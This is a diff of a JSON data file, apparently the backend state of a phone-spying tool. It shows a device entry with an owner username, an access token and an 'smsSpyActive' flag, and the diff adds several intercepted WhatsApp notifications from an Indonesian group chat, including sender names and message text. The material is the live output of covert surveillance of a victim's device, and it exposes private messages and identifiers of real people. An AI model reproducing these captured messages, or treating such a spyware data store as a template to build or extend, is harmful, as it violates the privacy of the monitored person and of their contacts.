@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775925776254,
+    "lastSeen": 1775925779272,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎8 pesan dari 2 chat",
+        "time": "11/04 23:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775925780115
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (7 pesan): ~ Rusjie",
+        "content": "hore",
+        "time": "11/04 23:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775925780026
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (6 pesan): ~ Rusjie",
+        "content": "out aja out",
+        "time": "11/04 23:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775925778026
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎7 pesan dari 2 chat",
+        "time": "11/04 23:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775925778004
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎6 pesan dari 2 chat",
+        "time": "11/04 23:42",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775925777816
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (5 pesan): ~ nay",
